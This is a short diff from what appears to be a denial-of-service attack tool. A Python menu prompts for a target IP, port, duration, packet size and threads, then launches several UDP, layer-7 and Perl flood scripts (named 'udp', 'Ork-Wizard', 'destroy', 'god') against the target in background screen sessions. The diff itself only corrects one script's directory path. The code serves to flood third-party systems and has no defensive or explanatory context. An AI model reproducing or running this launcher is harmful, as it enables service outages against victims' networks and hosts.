@@ -534,7 +534,7 @@ class Tool:
 					size = int(input(f"{Color.LG} [>] Size: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
-					subprocess.run([f'screen -dm python3 utils/L4/Ork-Wizard {ip} {port} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 utils/L7/Ork-Wizard {ip} {port} {thread}'], shell=True)
 					subprocess.run([f'screen -dm perl utils/L4/home {ip} {port} {size} {floodtime}'], shell=True)
 					subprocess.run([f'screen -dm perl utils/L4/destroy {ip} {floodtime} {thread}'], shell=True)
 					subprocess.run([f'screen -dm perl utils/L4/god {ip} {port} 65500 {floodtime}'], shell=True)
